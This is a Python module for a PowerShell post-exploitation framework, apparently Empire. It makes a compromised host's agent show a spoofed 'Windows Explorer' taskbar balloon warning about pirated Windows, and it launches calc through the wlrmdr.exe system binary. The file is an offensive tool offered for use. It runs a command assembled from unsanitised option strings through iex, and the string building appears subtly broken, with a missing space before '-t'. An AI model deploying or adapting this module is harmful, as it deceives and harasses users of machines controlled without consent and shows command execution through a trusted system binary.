from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-WLMDR',

            'Author': ['@benichmt1'],

            'Description': ("Displays a balloon reminder in the taskbar."),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : False,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                ''
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Message' : {
                'Description'   :   'Message text to display.',
                'Required'      :   True,
                'Value'         :   'You are using a pirated version of Microsoft Windows.'
            },
            'IconType' : {
                'Description'   :   'Critical, Exclamation, Information, Key, or None',
                'Required'      :   True,
                'Value'         :   'Key'
            },
            'Title' : {
                'Description'   :   'Title of the message box to display.',
                'Required'      :   True,
                'Value'         :   'Windows Explorer'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        script = """
function Invoke-Wlrmdr {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, Position = 0)]
        [String] $Message = "You are using pirated Windows",
        
        [Parameter(Mandatory = $True, Position = 1)]
        [String] $IconType = "Key",
        [Parameter(Mandatory = $True, Position = 2)]
        [String] $Title = "Windows Explorer"
    )
$command = "wlrmdr.exe -s 60000 -f "
$Iaintgotnotype = switch ($IconType) 
    { 
        "Critical" {6} 
        "Exclamation" {5} 
        "Information" {1} 
        "Key" {4} 
        "None" {0} 
        default {0}
    }
$command += $Iaintgotnotype
$command += "-t "
$command += $Title
$command += " -m "
$command += $Message
$command += " -a 10 -u calc"
iex $command
}
Invoke-Wlrmdr"""

        for option,values in self.options.iteritems():
            if option.lower() != "agent" and option.lower() != "computername":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " \"" + str(values['Value'].strip("\"")) + "\""
        if obfuscate:
            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
        return script
